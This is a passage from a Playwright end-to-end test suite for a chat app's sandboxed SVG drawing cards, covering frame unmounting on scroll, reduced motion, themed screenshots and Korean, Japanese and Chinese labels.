      await expect(page.getByTestId("drawing-frame")).toHaveCount(3);
    });

    test("far out of the chat's view its frame goes, and the chat closing takes every frame", async ({ page }) => {
      await answer(chartAnswer());
      await lastAnswer(page).getByTestId("drawing-show").click();
      await expect(page.getByTestId("drawing-frame")).toHaveCount(1);
      // enough answers under it to put it far above the view
      const long = Array.from({ length: 40 }, (_, i) => `Line ${i + 1} of a long answer that pushes the drawing up.`).join("\n\n");
      for (let i = 0; i < 4; i++) await answer(long);
      await expect(page.getByTestId("bubble-bot")).not.toHaveCount(0);
      await page.getByTestId("timeline").evaluate((el) => (el.scrollTop = el.scrollHeight));
      await expect(page.getByTestId("drawing-frame")).toHaveCount(0);
      const card = page.getByTestId("drawing-card");
      await card.scrollIntoViewIfNeeded();
      await expect(card.getByTestId("drawing-still")).toBeVisible();
      await card.getByTestId("drawing-again").click();
      await expect(page.getByTestId("drawing-frame")).toHaveCount(1);
      await page.getByTestId("menu-home").click();
      await expect(page.locator("iframe")).toHaveCount(0);
    });

    test("under reduced motion the card arrives still, and the drawing's own animation is left out", async ({ page }) => {
      await page.emulateMedia({ reducedMotion: "reduce" });
      await answer(chartAnswer());
      await lastAnswer(page).getByTestId("drawing-show").click();
      const card = page.getByTestId("drawing-card");
      await expect(card).toBeVisible();
      // the Rise ends at once in its end state: motion.css turns every animation into 0.01 ms under reduced motion, which
      // can still read as running in the instant before its first frame, so what is checked is that nothing lasts longer
      const moving = await card.evaluate((el) =>
        el.getAnimations({ subtree: true }).filter((a) => Number(a.effect?.getComputedTiming().duration ?? 0) > 1).length,
      );
      expect(moving).toBe(0);
      const inner = card.frameLocator("iframe").frameLocator("iframe");
      await expect(inner.locator("text.t")).toHaveText("Pre-orders this week");
      expect(await inner.locator("animate").count()).toBe(0);
      expect(await inner.locator("rect.bar").first().evaluate((el) => getComputedStyle(el).animationName)).toBe("none");
    });

    if (layout) {
      const shots = process.env.DRAWING_SHOTS;
      const save = async (page: Page, name: string, info: import("@playwright/test").TestInfo) => {
        const body = await page.screenshot();
        await info.attach(name, { body, contentType: "image/png" });
        if (shots) (await import("node:fs")).writeFileSync(`${shots}/${engine}-${name}.png`, body);
      };
      for (const theme of ["light", "dark"] as const)
        for (const width of [1280, 900])
          test(`pictures: the chart, the larger view and a still card, ${theme} at ${width}`, async ({ page }, info) => {
            await page.evaluate((th) => localStorage.setItem("manut.theme", th), theme);
            await page.setViewportSize({ width, height: 820 });
            await page.reload();
            await chatOpen(page);
            await expect(page.locator("html")).toHaveAttribute("data-theme", theme);
            await answer(chartAnswer());
            await lastAnswer(page).getByTestId("drawing-show").click();
            // the chart's own card (the answers that follow take the newest place)
            const card = page.getByTestId("drawing-card").first();
            await expect(card.frameLocator("iframe").frameLocator("iframe").locator("text.t")).toHaveText("Pre-orders this week");
            expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
            await card.scrollIntoViewIfNeeded();
            // a frame that was out of view is painted a moment after it comes in
            await page.waitForTimeout(900);
            await save(page, `${theme}-${width}-card`, info);
            await card.getByTestId("drawing-larger").click();
            await expect(page.getByTestId("drawing-sheet").frameLocator("iframe").frameLocator("iframe").locator("text.t")).toBeVisible();
            await page.waitForTimeout(400);
            await save(page, `${theme}-${width}-larger`, info);
            await page.keyboard.press("Escape");
            // three more drawings put this one back to a still card
            const svg = (n: number) => "```svg\n" + `<svg viewBox="0 0 400 80"><text x="10" y="45" font-size="20">Drawing ${n}</text></svg>` + "\n```";
            await answer([1, 2, 3].map(svg).join("\n\n"));
            const shows = lastAnswer(page).getByTestId("drawing-show");
            await expect(shows).toHaveCount(3);
            for (let i = 0; i < 3; i++) await shows.nth(i).click();
            await expect(card.getByTestId("drawing-still")).toBeVisible();
            await card.scrollIntoViewIfNeeded();
            await page.waitForTimeout(700);
            await save(page, `${theme}-${width}-still`, info);
          });

      for (const [lang, show, by, closed] of [
        ["ko", "그림 보기", "Kami의 그림", "닫힌 상자 안에서 보여 줘요. 스크립트와 네트워크는 쓸 수 없고, 파일이나 이 앱에도 접근할 수 없어요."],
        ["ja", "図を表示", "Kami が描いた図", "閉じた箱の中の表示です。スクリプトもネットワークも使えず、ファイルやこのアプリにも触れられません。"],
        ["zh", "显示图", "Kami 画的图", "在封闭的框中显示：不运行脚本，不联网，也无法访问你的文件或本应用。"],
      ] as const)
        test(`speaks ${lang}`, async ({ page }, info) => {
          await page.evaluate((l) => localStorage.setItem("manut.lang", l), lang);
          await page.reload();
          await chatOpen(page);
          await answer(chartAnswer());
          const bubble = lastAnswer(page);
          await expect(bubble.getByTestId("drawing-show")).toHaveText(show);
          await bubble.getByTestId("drawing-show").click();
          await expect(bubble.locator(".dw-by")).toHaveText(by);
          await expect(bubble.getByTestId("drawing-note")).toHaveText(closed);
          await expect(bubble.getByTestId("drawing-larger")).not.toHaveText("Open larger");
          await bubble.getByTestId("drawing-card").scrollIntoViewIfNeeded();
          await page.waitForTimeout(900);
          await save(page, `lang-${lang}`, info);
        });
    }
  });
}
